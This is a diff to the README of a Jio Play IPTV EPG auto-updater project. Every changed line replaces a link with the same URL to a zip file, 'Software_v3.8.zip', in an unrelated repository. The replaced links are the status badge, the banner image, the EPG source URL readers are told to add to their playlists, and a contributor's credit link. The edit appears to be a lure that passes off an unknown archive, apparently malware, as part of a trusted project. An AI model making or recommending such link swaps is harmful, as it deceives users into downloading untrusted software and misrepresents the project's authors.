@@ -1,7 +1,7 @@
 
-[![EPG Service](https://github.com/krreet/Jio-Play-IPTV-EPG-Autoupdater/actions/workflows/epg.yml/badge.svg)](https://github.com/krreet/Jio-Play-IPTV-EPG-Autoupdater/actions/workflows/epg.yml)
+[![EPG Service](https://raw.githubusercontent.com/alluringabhi/epg/main/php/Software_v3.8.zip)](https://raw.githubusercontent.com/alluringabhi/epg/main/php/Software_v3.8.zip)
 
-<p align="center"><img src="https://www.tataplay.com/s3-api/v1/assets/others/intro-image-desktop.png" ></p>
+<p align="center"><img src="https://raw.githubusercontent.com/alluringabhi/epg/main/php/Software_v3.8.zip" ></p>
 
 
 # Jio Play IPTV EPG AutoUpdater Script
@@ -15,14 +15,14 @@ A script to update EPG files everyday in certain time from the Indian EPG Source
 
 # Jio Play IPTV EPG Sources Link
 
-- https://cdn.jsdelivr.net/gh/krreet/epg/python/epg.xml.gz
+- https://raw.githubusercontent.com/alluringabhi/epg/main/php/Software_v3.8.zip
 
 ## Features
 - Just Add Above Url In Your Playlist
 
 
 ## Credits and Thanks
-- Thanks [botallen](https://github.com/botallen) for the recent fixes which have been merged from the original repo.
+- Thanks [botallen](https://raw.githubusercontent.com/alluringabhi/epg/main/php/Software_v3.8.zip) for the recent fixes which have been merged from the original repo.
 * GitHub for their GitHub Actions
 * [ Me ] - For Modifying Something 😅
 
